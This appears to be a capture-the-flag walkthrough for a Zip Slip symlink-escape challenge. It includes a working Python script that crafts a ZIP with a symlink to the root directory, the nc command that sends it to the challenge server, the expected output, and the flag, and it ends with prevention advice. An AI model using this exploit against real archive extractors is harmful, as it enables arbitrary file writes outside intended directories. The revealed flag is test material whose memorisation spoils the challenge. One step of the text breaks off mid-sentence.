# Ouroboros Archive - Challenger Walkthrough

> A step-by-step guide from a challenger's perspective, starting with no prior knowledge.

## 🎯 Initial Assessment

### What You Receive
- `unzipper` - A Linux binary
- `README.md` - Challenge description
- `example_normal.zip` - Example ZIP file

### Connection Info
```bash
nc challenge.l3mon.com 1337
```

---

## 📖 Step 1: Read the Challenge Description

From the Challenge Description we 

---

## 🔬 Step 2: Analyze the Binary

### Initial Recon
```bash
file unzipper
# ELF 64-bit LSB pie executable, x86-64, dynamically linked

strings unzipper | grep -i path
# sandbox/  (path prefix!)
# Path validation failed

strings unzipper | grep -i flag
# [+] Flag:  (but no actual flag content!)
```

**Observation:** Flag is hidden/encoded - can't extract with strings.

### Decompile with Ghidra

Open `unzipper` in Ghidra and look for:
1. `sanitize_path()` function
2. ZIP extraction logic
3. Flag output function

**Key finding in sanitize_path:**
```c
if (strncmp(path, "sandbox/", 8) != 0) {
    printf("[!] Path validation failed: %s\n", path);
    return 0;
}
return 1;  // Path allowed!
```

> [!IMPORTANT]
> The validator only checks if path **STARTS WITH** "sandbox/"
> It does NOT resolve symlinks before checking!

---

## 💡 Step 3: Understand the Vulnerability

### Zip Slip Concept
ZIP files can contain:
- Regular files
- Directories
- **Symbolic links (symlinks)**

### The Attack Chain
1. Create a symlink `escape` → `/` (root)
2. Add a file `escape/tmp/pwned`
3. When extracted:
   - Binary validates `sandbox/escape` ✓ (starts with sandbox/)
   - Binary validates `sandbox/escape/tmp/pwned` ✓
   - **But `escape` is a symlink to `/`!**
   - File actually goes to `/tmp/pwned` (OUTSIDE sandbox!)

```
sandbox/escape → /
sandbox/escape/tmp/pwned → /tmp/pwned (escaped!)
```

---

## 🛠️ Step 4: Create the Exploit

### Python Script
```python
#!/usr/bin/env python3
import zipfile
import base64

# Create malicious ZIP
with zipfile.ZipFile('exploit.zip', 'w') as zf:
    # Symlink entry: escape → /
    info = zipfile.ZipInfo('escape')
    info.create_system = 3  # Unix
    info.external_attr = (0xA << 28) | (0o777 << 16)  # Symlink
    zf.writestr(info, '/')
    
    # Payload via the symlink
    zf.writestr('escape/tmp/pwned', 'EXPLOITED')

# Create base64 for netcat
with open('exploit.zip', 'rb') as f:
    b64 = base64.b64encode(f.read()).decode()
with open('exploit.b64', 'w') as f:
    f.write(b64)

print("[+] Created exploit.zip and exploit.b64")
```

### ZIP Structure Created
```
exploit.zip:
├── escape          (symlink → /)
└── escape/tmp/pwned (file with "EXPLOITED")
```

---

## 🚀 Step 5: Execute the Exploit

### Test Locally (if binary available)
```bash
./unzipper exploit.zip
```

### Attack Remote Server
```bash
cat exploit.b64 | nc challenge.l3mon.com 1337
```

### Expected Output
```
=== Ouroboros Archive Unpacker ===
Send your ZIP file (base64 encoded):
[*] Processing ZIP file (2 entries)...
[*] Extracting to sandbox/
[+] Created symlink: escape -> /
[+] Extracted: escape/tmp/pwned (9 bytes)

[!] ═══════════════════════════════════════
[!] EXPLOIT SUCCESSFUL!
[!] ═══════════════════════════════════════

[+] Flag: L3m0nCTF{symb0l1c_l1nk_3sc4p3_m4st3r}
```

---

## 🧠 Key Takeaways

| Vulnerability | Zip Slip (CVE-2018-1002200) |
|--------------|----------------------------|
| Root Cause | Path validation before symlink resolution |
| Exploit | Symlink to root + traversal path |
| Impact | Arbitrary file write outside sandbox |
| Prevention | Canonicalize paths before validation |

---

## 📚 References

- [Snyk Zip Slip Research](https://security.snyk.io/research/zip-slip-vulnerability)
- [CVE-2018-1002200](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-1002200)
- [OWASP Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)

---

**Flag:** `L3m0nCTF{symb0l1c_l1nk_3sc4p3_m4st3r}`
